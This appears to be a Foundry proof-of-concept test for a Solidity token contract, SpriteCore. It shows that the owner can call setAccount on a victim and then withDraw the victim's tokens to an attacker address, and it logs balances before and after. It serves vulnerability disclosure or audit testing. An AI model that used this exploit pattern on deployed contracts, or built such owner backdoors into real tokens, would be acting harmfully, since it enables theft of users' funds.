// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.0;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/SpriteCore.sol";

contract SpriteTokenTheftTest is Test {
    SpriteCore public token;
    address public owner = address(1);
    address public victim = address(2);
    address public attacker = address(3);
    bytes32 public constant CONTROL_ROLE = keccak256("CONTROL_ROLE");

    function setUp() public {
        vm.startPrank(owner);
        // Mint 1000 tokens (each token has 18 decimals)
        token = new SpriteCore(1000, owner);
        token.grantRole(CONTROL_ROLE, owner);
        vm.stopPrank();
    }

    function test_owner_takes_user_tokens() public {
        uint256 amount = 100 * (10 ** token.decimals());

        // Owner sends tokens to victim
        vm.prank(owner);
        token.transfer(victim, amount);
        assertEq(token.balanceOf(victim), amount, "Victim should have tokens");
        
        console.log("--- BEFORE-Trigger State ---");
        uint256 victimBalanceBefore = token.balanceOf(victim);
        uint256 attackerBalanceBefore = token.balanceOf(attacker);
        console.log("Victim balance:", victimBalanceBefore);
        console.log("Attacker balance:", attackerBalanceBefore);
        
        console.log("--- Trigger Attack ---");
        // Attack starts - owner steals victim's tokens
        vm.startPrank(owner);
        token.setAccount(victim);                      // Change token's account to victim
        token.withDraw(attacker, amount);              // Withdraw victim's tokens to attacker
        vm.stopPrank();
        
        console.log("--- AFTER-Trigger State ---");
        uint256 victimBalanceAfter = token.balanceOf(victim);
        uint256 attackerBalanceAfter = token.balanceOf(attacker);
        console.log("Victim balance:", victimBalanceAfter);
        console.log("Attacker balance:", attackerBalanceAfter);
        
        // Compare state changes
        bool tokensTransferred = 
            (victimBalanceAfter == 0) && 
            (attackerBalanceAfter == amount);
        bool vulnerabilityExists = tokensTransferred;
        
        if (vulnerabilityExists) {
            console.log("Vulnerability exists: Tokens successfully stolen from victim");
            console.log("Vulnerability Exists: Owner can arbitrarily set any account and withdraw its tokens");
        } else {
            console.log("Vulnerability not exist: Token balances not changed as expected");
            console.log("Vulnerability not Exist: Attack failed to transfer tokens");
        }
    }
}